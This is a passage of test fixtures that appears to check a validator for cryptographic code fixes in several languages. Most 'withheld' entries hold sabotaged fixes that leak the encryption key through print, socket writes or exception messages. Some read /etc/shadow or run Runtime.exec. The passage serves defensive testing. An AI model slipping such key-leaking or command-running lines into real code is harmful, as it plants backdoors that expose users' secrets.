+  "code": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    println(k.contentToString())\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: kotlin: raw string ${File.readText}",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    val s = \"\"\"${java.io.File(\"/etc/shadow\").readText()}\"\"\"\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: kotlin: annotated expression Runtime.exec",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    @Suppress(\"x\") Runtime.getRuntime().exec(\"id\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: GOOD js gcm without iv prefix (control)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: javascript: JS generator yield key -> throw new Error",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  function* g() { yield key; }\n  if (!data) throw new Error([...g()].join());\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: JS throw new Error(key) (control)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  if (!data) throw new Error(key.toString('hex'));\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: typescript: TS abstract class static field sock.end(key) #2",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  abstract class Z { static k = sock.end(key); }\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: typescript: TS abstract class method throw Error(key)",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  abstract class Z { m() { if (!data) throw new Error(key.toString('hex')); } }\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: JS append sha256(key) to ct (KCV)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(data), c.final(), c.getAuthTag(), crypto.createHash('sha256').update(key).digest()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: JS alias s = sock; s.write(key)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const s = sock;\n  s.write(key);\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: yield from key -> raise ValueError(bytes(g()))",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    nonce = os.urandom(12)\n    def g():\n        yield from key\n    ct = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt(data)\n    if not ct:\n        raise ValueError(bytes(g()))\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: csharp: GOOD csharp (return ct) (control)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    return a.EncryptEcb(d, PaddingMode.PKCS7);\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    return ct;\n  }\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: csharp: throw CryptographicException(ToBase64(k)) (control)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    return a.EncryptEcb(d, PaddingMode.PKCS7);\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    if (d.Length == 0) throw new CryptographicException(Convert.ToBase64String(k));\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: csharp: throw CryptographicException(ToBase64(@k)) verbatim ident",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    return a.EncryptEcb(d, PaddingMode.PKCS7);\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    if (d.Length == 0) throw new CryptographicException(Convert.ToBase64String(@k));\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: kotlin: throw ISE(String(k)) (control)",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    if (d.isEmpty()) throw IllegalStateException(String(k))\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: kotlin: throw ISE(String(k)) size (control)",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    if (d.size == 0) throw IllegalStateException(String(k))\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: kotlin: throw ISE(String(`k`)) backtick ident",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    if (d.size == 0) throw IllegalStateException(String(`k`))\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: kotlin: GOOD kotlin keyed (control)",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\nimport javax.crypto.spec.SecretKeySpec\nimport javax.crypto.spec.GCMParameterSpec\nimport java.security.SecureRandom\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    val iv = ByteArray(12)\n    SecureRandom().nextBytes(iv)\n    c.init(Cipher.ENCRYPT_MODE, SecretKeySpec(k, \"AES\"), GCMParameterSpec(128, iv))\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: kotlin: keyed: throw ISE(String(k)) (control)",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\nimport javax.crypto.spec.SecretKeySpec\nimport javax.crypto.spec.GCMParameterSpec\nimport java.security.SecureRandom\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    val iv = ByteArray(12)\n    SecureRandom().nextBytes(iv)\n    c.init(Cipher.ENCRYPT_MODE, SecretKeySpec(k, \"AES\"), GCMParameterSpec(128, iv))\n    if (d.size == 0) throw IllegalStateException(String(k))\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: kotlin: keyed: throw ISE(String(`k`)) backtick",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\nimport javax.crypto.spec.SecretKeySpec\nimport javax.crypto.spec.GCMParameterSpec\nimport java.security.SecureRandom\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    val iv = ByteArray(12)\n    SecureRandom().nextBytes(iv)\n    c.init(Cipher.ENCRYPT_MODE, SecretKeySpec(k, \"AES\"), GCMParameterSpec(128, iv))\n    if (d.size == 0) throw IllegalStateException(String(`k`))\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: kotlin: keyed: ct = `k` -> out.write(ct)",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\nimport javax.crypto.spec.SecretKeySpec\nimport javax.crypto.spec.GCMParameterSpec\nimport java.security.SecureRandom\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    val iv = ByteArray(12)\n    SecureRandom().nextBytes(iv)\n    c.init(Cipher.ENCRYPT_MODE, SecretKeySpec(k, \"AES\"), GCMParameterSpec(128, iv))\n    ct = `k`\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: python: GOOD py ecb->gcm nonce||ct||tag",
+  "lang": "python",
+  "window": "from Crypto.Cipher import AES\nimport os\n\ndef encrypt(data, key):\n    return AES.new(key, AES.MODE_ECB).encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "from Crypto.Cipher import AES\nimport os\n\ndef encrypt(data, key):\n    nonce = os.urandom(12)\n    ct, tag = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt_and_digest(data)\n    return nonce + ct + tag\n",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: python: GOOD py md5->sha256",
+  "lang": "python",
+  "window": "import hashlib\n\ndef fingerprint(blob):\n    return hashlib.md5(blob).hexdigest()",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import hashlib\n\ndef fingerprint(blob):\n    return hashlib.sha256(blob).hexdigest()\n",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: python: GOOD py random->secrets",
+  "lang": "python",
+  "window": "import random\nimport string\n\ndef make_token(n=32):\n    return ''.join(random.choice(string.ascii_letters) for _ in range(n))",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import secrets\nimport string\n\ndef make_token(n=32):\n    return ''.join(secrets.choice(string.ascii_letters) for _ in range(n))\n",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: python: GOOD py des->aes-gcm",
+  "lang": "python",
+  "window": "from Crypto.Cipher import DES\n\ndef enc(key, iv, data):\n    return DES.new(key, DES.MODE_CBC, iv).encrypt(data)",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "from Crypto.Cipher import AES\nimport os\n\ndef enc(key, iv, data):\n    nonce = os.urandom(12)\n    c = AES.new(key, AES.MODE_GCM, nonce=nonce)\n    ct, tag = c.encrypt_and_digest(data)\n    return nonce + ct + tag\n",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: python: GOOD py tls min 1.0->1.2",
+  "lang": "python",
+  "window": "import ssl\n\ndef ctx():\n    c = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    c.minimum_version = ssl.TLSVersion.TLSv1\n    return c",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_PROTOCOL"
+  ],
+  "code": "import ssl\n\ndef ctx():\n    c = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    c.minimum_version = ssl.TLSVersion.TLSv1_2\n    return c\n",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: python: GOOD py gcm nonce||ct to existing sock.sendall",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    nonce = os.urandom(12)\n    ct = nonce + AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt(data)\n    sock.sendall(ct)\n",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: javascript: GOOD ja ecb->gcm iv||ct||tag",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\n\nfunction enc(key, data) {\n  const c = crypto.createCipheriv('aes-256-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction enc(key, data) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  return Buffer.concat([iv, ct, c.getAuthTag()]);\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: javascript: GOOD ja md5->sha256",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\n\nfunction fp(buf) {\n  return crypto.createHash('md5').update(buf).digest('hex');\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction fp(buf) {\n  return crypto.createHash('sha256').update(buf).digest('hex');\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: javascript: GOOD ja Math.random->randomBytes",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\n\nfunction token() {\n  return Math.random().toString(36).slice(2);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction token() {\n  return crypto.randomBytes(16).toString('hex');\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: javascript: GOOD ja 3des->aes-gcm",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\n\nfunction enc(key, iv, data) {\n  const c = crypto.createCipheriv('des-ede3-cbc', key, iv);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction enc(key, iv, data) {\n  const nonce = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, nonce);\n  return Buffer.concat([nonce, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: javascript: GOOD ja tls minVersion 1.2",
+  "lang": "javascript",
+  "window": "const tls = require('tls');\n\nfunction open(host) {\n  return tls.connect({ host, port: 443, minVersion: 'TLSv1' });\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_PROTOCOL"
+  ],
+  "code": "const tls = require('tls');\n\nfunction open(host) {\n  return tls.connect({ host, port: 443, minVersion: 'TLSv1.2' });\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: javascript: GOOD ja gcm iv||ct to existing sock.write",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: typescript: GOOD ty ecb->gcm iv||ct||tag",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\n\nfunction enc(key, data) {\n  const c = crypto.createCipheriv('aes-256-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction enc(key, data) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  return Buffer.concat([iv, ct, c.getAuthTag()]);\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: typescript: GOOD ty md5->sha256",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\n\nfunction fp(buf) {\n  return crypto.createHash('md5').update(buf).digest('hex');\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction fp(buf) {\n  return crypto.createHash('sha256').update(buf).digest('hex');\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: typescript: GOOD ty Math.random->randomBytes",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\n\nfunction token() {\n  return Math.random().toString(36).slice(2);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction token() {\n  return crypto.randomBytes(16).toString('hex');\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: typescript: GOOD ty 3des->aes-gcm",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\n\nfunction enc(key, iv, data) {\n  const c = crypto.createCipheriv('des-ede3-cbc', key, iv);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction enc(key, iv, data) {\n  const nonce = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, nonce);\n  return Buffer.concat([nonce, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: typescript: GOOD ty tls minVersion 1.2",
+  "lang": "typescript",
+  "window": "const tls = require('tls');\n\nfunction open(host) {\n  return tls.connect({ host, port: 443, minVersion: 'TLSv1' });\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_PROTOCOL"
+  ],
+  "code": "const tls = require('tls');\n\nfunction open(host) {\n  return tls.connect({ host, port: 443, minVersion: 'TLSv1.2' });\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: typescript: GOOD ty gcm iv||ct to existing sock.write",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: java: GOOD java ecb->gcm iv||ct",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"));\n    return c.doFinal(d);\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.spec.GCMParameterSpec;\nimport java.security.SecureRandom;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    byte[] iv = new byte[12];\n    new SecureRandom().nextBytes(iv);\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"), new GCMParameterSpec(128, iv));\n    byte[] ct = c.doFinal(d);\n    byte[] out = new byte[iv.length + ct.length];\n    System.arraycopy(iv, 0, out, 0, iv.length);\n    System.arraycopy(ct, 0, out, iv.length, ct.length);\n    return out;\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: java: GOOD java md5->sha256",
+  "lang": "java",
+  "window": "import java.security.MessageDigest;\n\nclass H {\n  byte[] fp(byte[] b) throws Exception {\n    return MessageDigest.getInstance(\"MD5\").digest(b);\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
